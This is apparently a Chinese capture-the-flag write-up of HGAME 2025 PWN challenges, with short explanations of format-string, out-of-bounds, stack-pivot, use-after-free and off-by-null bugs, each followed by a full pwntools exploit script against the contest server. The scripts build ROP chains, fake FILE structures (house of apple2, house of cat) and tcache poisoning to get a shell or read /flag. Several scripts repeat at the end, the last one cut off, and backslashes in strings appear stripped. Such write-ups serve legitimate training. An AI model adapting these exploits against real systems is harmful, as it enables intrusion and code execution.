# HGAME2025杭州电子科技大学网络攻防大赛 PWN writeup

> 原文: https://www.ctfiot.com/228151.html
> ID: 228151

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

week1 

format

无数次格式化字符串漏洞，但是一次只有三个字节，vuln可以直接用-1绕过，关键是利用格式化字符串漏洞泄露出libc地址

可以用%*d+%s来泄露libc地址，后续直接打system的rop链子

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',31079)
#p = process('./pwn')

def cmd(a):
	rl("type something:")
	sl(a)

rl("you have n chance to getshelln n = ")
sl(str(2))
rl("type something:")
sl(b'%*d')
rl("type something:")
sl(b'%s')
libc_base=get_addr64()-2206368
li(hex(libc_base))
system,bin_sh=get_sb()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()

rl(" n = ")
#bug()
s(str(-1))
sleep(0.01)
payload=b'a'*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)
s(payload)

inter()	

counting petals

数组越界，v7最后一个越界到v8，v9，我们可以任意越界写，后边打印也会外带出libc地址，并且不是偶数有两次机会，第一次利用数组越界泄露libc地址，第二次走rop链子

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',30656)
#p = process('./pwn')

rl("nHow many flowers have you prepared this time?")
sl(str(16))

rl("nTell me the number of petals in each flower.")
for i in range(14):
	rl(" : ")
	sl(str(i+1))
rl(" : ")
#bug()
sl(str(15))

rl(" : ")
#bug()
sl(str(0x0000001000000015))
for i in range(5):
	rl(" : ")
	sl(b'-')

rl("Reply 1 indicates the former and 2 indicates the latter: ")
sl(str(1))

for i in range(18):
	rl(" + ")

libc_base=int(p.recv(15),10)-171408
li(hex(libc_base))
system,bin_sh=get_sb()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()

rl("nHow many flowers have you prepared this time?")
sl(str(16))

rl("nTell me the number of petals in each flower.")
for i in range(14):
	rl(" : ")
	sl(str(i+1))
rl(" : ")
#bug()
sl(str(15))

rl(" : ")
#bug()
sl(str(0x0000001000000016))
for i in range(2):
	rl(" : ")
	sl(b'-')

def pay(a):
	rl(" : ")
	sl(str(a))
pay(rdi)
pay(bin_sh)
pay(rdi+1)
pay(system)

rl("Reply 1 indicates the former and 2 indicates the latter: ")
sl(str(1))

inter()	

ezstack

webpwn

主体就是一个栈迁移，有0x10字节溢出，并且开启沙盒

这里给出gift，跟正常相比的就是fd位是4，最后orw的参数分别是0，5，4

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')

elf=ELF('./pwn')
#p = process('./pwn')
#p=remote('127.0.0.1',9999)
p=remote('node1.hgame.vidar.club',31421)
rdi=0x0000000000401713
rsi_r15=0x0000000000401711
bss=0x404154
read=0x40140F
leave_ret=0x401426
rbp=0x000000000040135d

rl("Good luck.n")

payload=b'a'*(0x50)+p64(bss)+p64(read)
#bug()
s(payload)
sleep(0.01)
pay2 =(p64(rsi_r15)+p64(elf.got['read'])*2+p64(elf.plt['write'])+p64(0x4013D2)).ljust(0x50,b'x00')
pay2+=p64(0x404104-8)+p64(leave_ret) 
#bug()
s(pay2)

libc_base=get_addr64()-libc.sym['read']
li(hex(libc_base))
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
mprotect=libc_base + libc.sym['mprotect']

rl("Good luck.n")
pay3=(p64(rsi)+p64(0x404530)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(0x4013D2)+b'/flagx00x00x00').ljust(0x50,b'x00')+p64(0x4040dc-8)+p64(leave_ret)
#bug()
s(pay3)

sleep(0.1)
flag=0x404530
stack=0x404130+0x500
orw = b'/flagx00x00x00'+p64(rdi) + p64(flag) #/flag的字符串位置，要改
orw += p64(rsi) + p64(0)
orw += p64(rax)+p64(2)+p64(syscall)
orw += p64(rdi) + p64(5)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(read)
orw += p64(rdi) + p64(4)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(write)

sl(orw)

sleep(0.1)

payload=b'a'*(0x50)+p64(0x404530)+p64(leave_ret)

#bug()
s(payload)

'''
sleep(0.1)

pay3=(p64(rsi)+p64(bss)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(bss)).ljust(0x50,b'x00')+p64(0x4040d4-8)+p64(leave_ret)
bug()
s(pay3)

pause()
flag=0x40420c
stack=0x404130+0x500
orw = p64(rdi) + p64(flag) #/flag的字符串位置，要改
orw += p64(rsi) + p64(0)
orw += p64(rax)+p64(2)+p64(syscall)
orw += p64(rdi) + p64(3)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(write)+b'/flagx00x00x00'

sl(orw)
'''
inter()	

 week2 

Hit list

add

edit

gift

典菜单堆题，漏洞点uaf

add限制堆块大小<=0x3f0，这样就不能进行largerbin attack了，每次申请堆块会申请0x20的信息堆块

同时给出gift，可以任意地址free，触发条件是malloc(0)

edit是先将堆块free之后利用申请堆块的部分将堆块再次申请出来写入

首先就是泄露堆地址，申请两个共同大小的堆块，释放后申请0x20大小的堆块，就可以得到堆地址

其次是泄露libc地址，释放大于0x88的堆块，先将tcachebin添慢，中间0x30的堆块如果满的话没办法free，我们可以申请0x20的堆块再次释放，就可以拿到libc地址

最后我们申请一个大堆块，伪造好合适的size，利用gift将伪造的堆块释放，之后edit大堆块就可以完成tcachebin attack，攻击IO_list_all，写入我们伪造fake_io的堆地址，走house of apple2，exit退出触发getshell

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',32272)
#p = process('./pwn')

def add(i,size,content):
	rl(">")
	sl(str(1))
	rl(">")
	sl(str(i))
	rl(">")
	sl(b'a'*7)
	rl(">")
	sl(str(size))
	rl(">")
	s(content)
def free(i):
	rl(">")
	sl(str(2))
	rl(">")
	sl(str(i))
def edit(i,name,size,content):
	rl(">")
	sl(str(3))
	rl(">")
	sl(str(i))
	rl(">")
	sl(name)
	rl(">")
	sl(str(size))
	rl(">")
	s(content)
	
	
def show(i):
	rl(">")
	sl(str(4))
	rl(">")
	sl(str(i))

	

add(0,0x68,b'a')
add(1,0x68,b'a')
add(2,0x68,b'a')
free(0)
free(1)
add(3,0x20,b'a'*(0x10))
show(1)
rl("Information: aaaaaaaaaaaaaaaa")
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x2d0
li(hex(heap_base))
free(1)
add(0,0x20,b'a')
add(1,0x68,b'a')
add(2,0x68,b'a')

for i in range(20):
	add(i+3,0x90,b'a')
for i in range(7):
	free(i+3)
add(21,0x20,b'a')
free(11)
free(13)
add(22,0x38,b'a')#16
show(16)
libc_base=get_addr64()-2207073
li(hex(libc_base))

system,bin_sh=get_sb()
IO_list_all=libc_base+libc.sym['_IO_list_all']-0x10
setcontext=libc_base+libc.sym['setcontext']
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
add(23,0x40,b'a')#17
add(24,0x100,b'x00'*0x30+p64(0x81)+b'a'*8)

#add(25,-10,hex(heap_base+0x950))
rl(">")
sl(str(1))
rl(">")
sl(str(25))
rl(">")
sl(b'a'*7)
rl(">")
sl(str(-10))
rl(">")
sl(hex(heap_base+0x1590))
IO_list_all_xor=(heap_base+0x1590>>12)^IO_list_all
edit(18,b'a',0x100,b'x00'*(0x30)+p64(0x81)+p64(IO_list_all_xor))

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

chunk3=heap_base+0x1660-0x8 # 伪造的fake_IO结构体的地址

shell=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)

fake_ret=chunk3+0xe0+0xe0+0x18

IO_FILE1 = p64(0)*3+p64(1)+b'x00'*0x38+p64(0) #_chain
IO_FILE1+= p32(0)+b'x08' #_flags2
IO_FILE1 = IO_FILE1.ljust(0x80,b'x00')+p64(chunk3) #lock
IO_FILE1 = IO_FILE1.ljust(0x90,b'x00')+p64(chunk3+0xe0) #_wide_data *** rdx
IO_FILE1 = IO_FILE1.ljust(0xb0,b'x00')
IO_FILE1 = IO_FILE1.ljust(0xc8,b'x00')+p64(_IO_wfile_jumps) #vtable

IO_FILE1+= b'x00'.ljust(0xa0,b'x00')+p64(fake_ret)+p64(rdi+1)
IO_FILE1+= b'/flagx00x00x00'.ljust(0x30,b'x00')+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext+61)
IO_FILE1+= p64(rdi+1)*2+shell

add(25,0x68,b'a')

add(26,0x3f0,IO_FILE1)
add(27,0x68,b'x00'*8+p64(chunk3))

rl(">")
sl(str(5))
inter()	

Where is the vulnerability

菜单堆题，2.39

add,edit,free,show四个功能正常

存在uaf漏洞，这里直接走house of cat就行

存在沙盒，走orw

三个库patch一下就行，不要忘了更改权限

patchelf --replace-needed libc.so.6 路径 文件
patchelf --replace-needed libhgame.so 路径 文件
patchelf --set-interpreter ./ld-2.23.so 路径 文件

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',31346)
#p = process('./pwn')
def add(i,size):
	rl("5. Exit")
	sl(str(1))
	rl("Index: ")
	sl(str(i))
	rl("Size: ")
	sl(str(size))
	
def free(i):
	rl("5. Exit")
	sl(str(2))
	rl("Index: ")
	sl(str(i))

def edit(i,content):
	rl("5. Exit")
	sl(str(3))
	rl("Index: ")
	sl(str(i))
	rl("Content: ")
	s(content)

def show(i):
	rl("5. Exit")
	sl(str(4))
	rl("Index: ")
	sl(str(i))
add(0,0x520) #0
add(1,0x558) #1
add(2,0x510) #2
add(3,0x550) #3

free(0)
show(0)
libc_base=get_addr64()-2112288
li(hex(libc_base))
system,bin_sh=get_sb()
IO_list_all=libc_base+libc.sym['_IO_list_all']
setcontext=libc_base+libc.sym['setcontext']
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+0x0000000000066b9a
#rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']

add(4,0x600)
edit(0,b'a'*(0x10))
show(0)
rl(b'a'*(0x10))
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x290
li(hex(heap_base))

free(2)
edit(0,p64(libc_base+2113360)*2+p64(heap_base+0x290)+p64(IO_list_all-0x20))
add(5,0x600)

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

chunk3=heap_base+0xd20 # 伪造的fake_IO结构体的地址

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

fake_IO_FILE =p64(0)*2+p64(1)+p64(chunk3+0x8) 
fake_IO_FILE =fake_IO_FILE.ljust(0x60,b'x00') 
fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi
fake_IO_FILE +=p64(heap_base) 
fake_IO_FILE +=p64(0x100) #rdx
fake_IO_FILE =fake_IO_FILE.ljust(0x90, b'x00')
fake_IO_FILE +=p64(chunk3+0x8) #_wide_data,rax1_addr
fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1) #rsp
fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2
fake_IO_FILE +=p64(_IO_wfile_jumps+0x30) # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)
fake_IO_FILE +=p64(read)

edit(2,fake_IO_FILE)

#bug()
rl("5. Exit")
sl(str(5))

sleep(0.1)

orw = p64(rdi) + p64(heap_base+0xea0) 
orw += p64(rsi) + p64(0)
orw += p64(rax)+p64(2)+p64(syscall)

orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap_base+0x100)
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap_base+0x100)
orw += p64(write)+b'./flagx00x00'
sl(orw)

inter()	

signin2Heap

菜单堆题，2.27

add，free,show三个功能函数

add中存在of by null漏洞，限制大小<0xff

因为add会将最后一个字符转为x00会将打印函数截断

这里我们先把tcache塞满，之后能得到进入unsortdbin堆块，控制好堆布局，将下一个堆块的pr_size和pr_inuse位修改，释放触发堆块合并，之后将第一个堆块申请出来，libc地址就会进入第二个堆块中，这个堆块还没有释放，泄露得到libc

之后再次造成堆块合并，同时申请出第一个堆块包含第二个（未释放）fd位，释放第二个堆块，我们就可以更改它的fd位，完成tcachebin attack，攻击free_hook，getshell

原理的话可以看这篇文章https://www.jianshu.com/p/056c9db22d81

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc-2.27.so') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',31701)
#p = process('./pwn')

def add(i,size,content):
	rl("Your choice:")
	sl(p32(1))
	rl("Index: ")
	sl(str(i))
	rl("Size: ")
	sl(str(size))
	rl("Content: ")
	s(content)
def show(i):
	rl("Your choice:")
	sl(p32(3))
	rl("Index: ")
	sl(str(i))
def free(i):
	rl("Your choice:")
	sl(p32(2))
	rl("Index: ")
	sl(str(i))
for i in range(7):
 add(i,0xf8,"aaaa")

add(7,0xf8,"aaaa")#7
add(8,0x88,"aaaa")#8
add(9,0xf8,"aaaa")#9
add(10,0x88,"aaaa")#10
for i in range(7):
 free(i)
free(8)
free(7)

add(11,0x88,b'a'*0x80+p64(0x90+0x100))

free(9)
#bug()
for i in range(7):
 add(i,0xf8,"/bin/shx00")
add(7,0xf8,"cccc")
show(11)
libc_base=get_addr64()-4111520
li(hex(libc_base))
system,bin_sh=get_sb()
malloc_hook,free_hook=get_hook()
add(8,0x88,b'a')
add(9,0xf8,b'a')

for i in range(7):
 free(i)

free(8)
free(7)
add(12,0x88,b'a'*0x80+p64(0x90+0x100))
free(9)

add(13,0x88,b'a')
free(13)
free(11)
add(14,0xb8,b'x00'*0x60+p64(0x100)+p64(0x90)+p64(free_hook))
add(0,0x88,b'/bin/shx00')
add(1,0x88,p64(system))

#bug()
free(0)

inter()

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',31079)
#p = process('./pwn')

def cmd(a):
	rl("type something:")
	sl(a)

rl("you have n chance to getshelln n = ")
sl(str(2))
rl("type something:")
sl(b'%*d')
rl("type something:")
sl(b'%s')
libc_base=get_addr64()-2206368
li(hex(libc_base))
system,bin_sh=get_sb()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()

rl(" n = ")
#bug()
s(str(-1))
sleep(0.01)
payload=b'a'*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)
s(payload)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',30656)
#p = process('./pwn')

rl("nHow many flowers have you prepared this time?")
sl(str(16))

rl("nTell me the number of petals in each flower.")
for i in range(14):
	rl(" : ")
	sl(str(i+1))
rl(" : ")
#bug()
sl(str(15))

rl(" : ")
#bug()
sl(str(0x0000001000000015))
for i in range(5):
	rl(" : ")
	sl(b'-')

rl("Reply 1 indicates the former and 2 indicates the latter: ")
sl(str(1))

for i in range(18):
	rl(" + ")

libc_base=int(p.recv(15),10)-171408
li(hex(libc_base))
system,bin_sh=get_sb()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()

rl("nHow many flowers have you prepared this time?")
sl(str(16))

rl("nTell me the number of petals in each flower.")
for i in range(14):
	rl(" : ")
	sl(str(i+1))
rl(" : ")
#bug()
sl(str(15))

rl(" : ")
#bug()
sl(str(0x0000001000000016))
for i in range(2):
	rl(" : ")
	sl(b'-')

def pay(a):
	rl(" : ")
	sl(str(a))
pay(rdi)
pay(bin_sh)
pay(rdi+1)
pay(system)

rl("Reply 1 indicates the former and 2 indicates the latter: ")
sl(str(1))

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')

elf=ELF('./pwn')
#p = process('./pwn')
#p=remote('127.0.0.1',9999)
p=remote('node1.hgame.vidar.club',31421)
rdi=0x0000000000401713
rsi_r15=0x0000000000401711
bss=0x404154
read=0x40140F
leave_ret=0x401426
rbp=0x000000000040135d

rl("Good luck.n")

payload=b'a'*(0x50)+p64(bss)+p64(read)
#bug()
s(payload)
sleep(0.01)
pay2 =(p64(rsi_r15)+p64(elf.got['read'])*2+p64(elf.plt['write'])+p64(0x4013D2)).ljust(0x50,b'x00')
pay2+=p64(0x404104-8)+p64(leave_ret) 
#bug()
s(pay2)

libc_base=get_addr64()-libc.sym['read']
li(hex(libc_base))
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
mprotect=libc_base + libc.sym['mprotect']

rl("Good luck.n")
pay3=(p64(rsi)+p64(0x404530)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(0x4013D2)+b'/flagx00x00x00').ljust(0x50,b'x00')+p64(0x4040dc-8)+p64(leave_ret)
#bug()
s(pay3)

sleep(0.1)
flag=0x404530
stack=0x404130+0x500
orw = b'/flagx00x00x00'+p64(rdi) + p64(flag) #/flag的字符串位置，要改
orw += p64(rsi) + p64(0)
orw += p64(rax)+p64(2)+p64(syscall)
orw += p64(rdi) + p64(5)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(read)
orw += p64(rdi) + p64(4)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(write)

sl(orw)

sleep(0.1)

payload=b'a'*(0x50)+p64(0x404530)+p64(leave_ret)

#bug()
s(payload)

'''
sleep(0.1)

pay3=(p64(rsi)+p64(bss)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(bss)).ljust(0x50,b'x00')+p64(0x4040d4-8)+p64(leave_ret)
bug()
s(pay3)

pause()
flag=0x40420c
stack=0x404130+0x500
orw = p64(rdi) + p64(flag) #/flag的字符串位置，要改
orw += p64(rsi) + p64(0)
orw += p64(rax)+p64(2)+p64(syscall)
orw += p64(rdi) + p64(3)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(stack+0x200) #读入flag的位置
orw += p64(write)+b'/flagx00x00x00'

sl(orw)
'''
inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
